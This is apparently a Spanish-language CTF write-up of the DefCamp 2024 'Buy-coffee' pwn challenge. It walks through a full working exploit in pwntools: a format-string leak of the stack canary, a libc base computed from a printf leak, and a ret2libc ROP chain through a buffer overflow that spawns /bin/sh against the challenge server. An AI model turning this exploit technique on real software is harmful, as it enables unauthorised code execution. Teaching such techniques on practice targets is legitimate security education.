---
layout: post
title: Buy-coffee DefCamp 2024
comments: true
categories: [Pwn, Writeups, DefCamp]
---

Este es un reto de la competición de CTF DefCamp 2024, organizada por [DefCamp](https://www.linkedin.com/company/defcamp/?originalSubdomain=es). Este fue uno de los 4 retos de la categoría de PWN, el único de dificultad *Medium*.

![Image]({{ site.baseurl }}/images/posts/2024-10-1-Buy-coffee-DefCamp24-CTF-Logo.png)

# Overview

En este reto se ataca un binario de 64 bits con todas las protecciones activas. Deberemos bypasearlas mediante un *leak de libc* y un *Format string* para finalmente ejecutar una *ROPchain* gracias a un *Buffer overflow*.

# Reconocimiento

    It’s early morning, and the caffeine hasn’t quite kicked in yet. As you sip your cup of coffee, you notice something odd – a mysterious program named cooffee is running on your system.

Se nos da un archivo de *libc* y un binario que analizaremos con *checksec*:

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Vemos que están todas las protecciones activas.

Descompilando con *ghidra*:

```c
int main(void) {
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  coffee();
  puts("Party!");
  return 0;
}

void coffee(void)
{
  long in_FS_OFFSET;    //Canary
  char input [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  
  printf("Coffee Time\n$ ");
  gets(input);      /* BUFFER OVERFLOW */
  printf(input);    /* FORMAT STRING */
  
  printf("What is this? %p\n",printf);    /* LEAK */
  printf("\nCoffee Time\n$ ");
  fread(input,1,0x50,stdin);    /* FORMAT STRING */
  puts(input);
  
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {    /* Canary check */
    __stack_chk_fail();
  }
  return;
}
```

Vemos que a pesar de la simpleza del programa, disponemos de varios fallos de seguridad que podemos aprovechar.

Si utilizamos el *Format string* para "*leakear*" el valor del *Canary*, podemos utilizar el leak de `printf` para calcular la dirección base de libc y mandar una *ROPchain* en el último *BOF*.

# Explotación

## Sacando el canario

Para filtrar el *Canary* debemos utilizar el *Format string*, concretamente un especificador de formato como `"%n$x"`, e iremos probando con distintas `n` hasta encontrar un valor acabado en `00`. En este caso lo haremos con un script de *python*:

```python
#!/bin/python3
from pwn import *

for i in range(0, 15):
	io = process('./chall')
	io.recvuntil(b"$ ")
	io.sendline(f"%{i}$x")
	print(io.recvline().decode())
```

En este caso, vemos que está en la posición `9`.

## Calculando la dirección base de Libc

A partir de este punto podemos utilizar [*pwntools*](https://github.com/Gallopsled/pwntools) e ir escribiendo un script para facilitar las cosas:

```python
#! /bin/python3
import re
from pwn import *

libc = ELF('libc-2.31.so')

def start():
    if args.REMOTE:
        return remote('35.234.95.200', 31484)
    else:
        return process('./chall_patched')

io = start()

#1er input -> LEAK CANARY - PRINTF
io.recvuntil(b"$ ")
io.sendline(b"%9$lx")
leaks = io.recvline().decode()

canary = re.search(r'^[0-9a-fA-F]+', leaks).group() # Capturamos el valor del canary
canary = int(canary, 16)

printf_leak = re.search(r'0x[0-9a-fA-F]+', leaks).group()   # Capturamos el valor del leak
printf_leak = int(printf_leak, 16)

log.info(f"Canary -> {hex(canary)}")
log.info(f"Printf -> {hex(printf_leak)}")
```

Hasta este punto sólo hemos recogido el valor del leak y del canario. Teniendo el leak, sólo debemos buscar la dirección de `printf` en Libc y restársela al leak:

```python
#Calculamos la dir base de libc
base_libc = printf_leak - libc.symbols["printf"]

log.info(f"Base Libc -> {hex(base_libc)}")
```

## Calculando las direcciones que nos faltan

Ahora debemos calcular la dirección de `system` y buscar en Libc el offset hasta la cadena `/bin/sh` (y añadirle a la dirección base):

```python
#Buscamos la cadena /bin/sh
bin_sh = base_libc + next(libc.search(b'/bin/sh'))
log.info(f"Bin_sh -> {hex(bin_sh)}")

#Calculamos la direccion de system
system = base_libc + libc.symbols['system']
log.info(f"System -> {hex(system)}")
```

## Construyendo el payload

Finalmente, haciendo uso de los gadgets de la propia Libc podemos poner cada valor en su registro (hace falta además un gadget `ret` que *alinee el stack*):

```python
#2o input
io.recvuntil(b"$ ")

payload = b'A'*24
payload += p64(canary)
payload += b'B'*8
payload += p64(base_libc + 0x23b6a) #0x0000000000023b6a: pop rdi; ret;
payload += p64(bin_sh)
payload += p64(base_libc + 0x22679) #0x0000000000022679: ret;
payload += p64(system)
payload += b'C'*16

io.sendline(payload)

io.interactive()
```

## Script completo

El script nos quedará así:

```python
#! /bin/python3
import re
from pwn import *

libc = ELF('libc-2.31.so')

def start():
    if args.REMOTE:
        return remote('35.234.95.200', 31484)
    else:
        return process('./chall_patched')

io = start()

#1er input -> LEAK CANARY - PRINTF
io.recvuntil(b"$ ")
io.sendline(b"%9$lx")
leaks = io.recvline().decode()

canary = re.search(r'^[0-9a-fA-F]+', leaks).group() # Capturamos el valor del canary
canary = int(canary, 16)

printf_leak = re.search(r'0x[0-9a-fA-F]+', leaks).group()   # Capturamos el valor del leak
printf_leak = int(printf_leak, 16)

log.info(f"Canary -> {hex(canary)}")
log.info(f"Printf -> {hex(printf_leak)}")

#Calculamos la dir base de libc
base_libc = printf_leak - libc.symbols["printf"]
log.info(f"Base Libc -> {hex(base_libc)}")

#Buscamos la cadena /bin/sh
bin_sh = base_libc + next(libc.search(b'/bin/sh'))
log.info(f"Bin_sh -> {hex(bin_sh)}")

#Calculamos la direccion de system
system = base_libc + libc.symbols['system']
log.info(f"System -> {hex(system)}")

#2o input
io.recvuntil(b"$ ")

payload = b'A'*24
payload += p64(canary)
payload += b'B'*8
payload += p64(base_libc + 0x23b6a) #0x0000000000023b6a: pop rdi; ret;
payload += p64(bin_sh)
payload += p64(base_libc + 0x22679) #0x0000000000022679: ret;
payload += p64(system)
payload += b'C'*16

io.sendline(payload)

io.interactive()
```

Ejecutamos y deberíamos obtener una shell. Este ejercicio es interesante para practicar cómo bypasear una protección de tipo Canary. Si te ha gustado, ¡nos vemos en el siguiente post!